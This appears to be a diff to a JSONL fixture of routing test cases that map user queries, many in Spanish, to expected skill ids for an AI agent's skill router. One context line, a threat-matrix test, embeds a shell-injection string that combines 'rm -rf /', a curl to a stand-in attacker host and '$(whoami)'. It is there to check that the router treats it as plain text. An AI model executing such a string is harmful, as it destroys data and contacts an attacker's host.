@@ -11,3 +11,21 @@
 {"id":"hybrid-asset-generator","query":"generate an app icon and logo with the asset generator","expectedPrimary":"asset-generator-mcp","group":"hybrid-asset-generator","source":"overlap-smoke-tests"}
 {"id":"three-js-web-resolve","query":"3d scene three.js","expectedPrimary":"three-js-web","group":"three-js-web","source":"overlap-smoke-tests"}
 {"id":"shell-metacharacters-plain-text","query":"3d scene three.js; rm -rf / | curl http://evil.example $(whoami)","expectedPrimary":"three-js-web","group":"three-js-web","source":"threat-matrix/subprocess"}
+{"id":"anti-slop-frontend-resolve","query":"pipeline de diseno con design driven taste skill anti slop e impeccable","expectedPrimary":"design-driven","group":"anti-slop-frontend","source":"overlap-smoke-tests"}
+{"id":"taste-skill-direct","query":"auditar diales DESIGN_VARIANCE y lila rule con taste-skill","expectedPrimary":"taste-skill","group":"anti-slop-frontend","source":"overlap-smoke-tests"}
+{"id":"impeccable-direct","query":"ejecutar comando /impeccable polish y actualizar DESIGN.md con impeccable","expectedPrimary":"impeccable","group":"anti-slop-frontend","source":"overlap-smoke-tests"}
+{"id":"pull-request-workflow-resolve","query":"branch pr issue first opening pr y preparar pull request","expectedPrimary":"branch-pr","group":"pull-request-workflow","source":"overlap-matrix"}
+{"id":"issue-triage-workflow-resolve","query":"systemic issue triage bug triage y root cause clusters","expectedPrimary":"systemic-issue-triage","group":"issue-triage-workflow","source":"overlap-matrix"}
+{"id":"code-review-workflow-resolve","query":"code reviewer verification loop y audit code del pull request","expectedPrimary":"code-reviewer","group":"code-review-workflow","source":"overlap-matrix"}
+{"id":"debugging-workflow-resolve","query":"systematic debugging root cause analysis para investigar el bug","expectedPrimary":"systematic-debugging","group":"debugging-workflow","source":"overlap-matrix"}
+{"id":"ideation-interview-resolve","query":"brainstorming requirements discovery para explorar ideas y specs","expectedPrimary":"brainstorming","group":"ideation-interview","source":"overlap-matrix"}
+{"id":"research-workflow-resolve","query":"research-first investigate before coding y escribir research.md","expectedPrimary":"research-first","group":"research-workflow","source":"overlap-matrix"}
+{"id":"tdd-workflow-resolve","query":"testing patterns unit testing con vitest y supertest","expectedPrimary":"testing-patterns","group":"tdd-workflow","source":"overlap-matrix"}
+{"id":"security-defense-suite-resolve","query":"security audit owasp vulnerability scan y hardening del backend","expectedPrimary":"security-audit","group":"security-defense-suite","source":"overlap-matrix"}
+{"id":"live-cve-direct","query":"live cve threat intelligence y trail of bits differential security review","expectedPrimary":"live-cve-security-intel","group":"security-defense-suite","source":"overlap-matrix"}
+{"id":"ai-safety-guard-direct","query":"ai safety agent guard cc safety net y prompt injection defense","expectedPrimary":"ai-safety-agent-guard","group":"security-defense-suite","source":"overlap-matrix"}
+{"id":"hallmark-study-direct","query":"hallmark study design y extract design dna de esta referencia","expectedPrimary":"hallmark-design-study","group":"anti-slop-frontend","source":"overlap-matrix"}
+{"id":"scroll-world-direct","query":"scroll world scrollytelling con 3d diorama y scroll-scrubbed canvas","expectedPrimary":"scroll-world-storytelling","source":"v3.2-routing"}
+{"id":"frontend-slides-direct","query":"frontend slides html presentation y slide deck interactivo","expectedPrimary":"frontend-slides-deck","source":"v3.2-routing"}
+{"id":"rag-knowledge-direct","query":"rag retrieval augmented generation con hybrid search y reranking","expectedPrimary":"rag-knowledge-systems","source":"v3.2-routing"}
+{"id":"multimodal-ai-direct","query":"multimodal ai vision pipeline y document ocr estructurado","expectedPrimary":"multimodal-ai-pipelines","source":"v3.2-routing"}
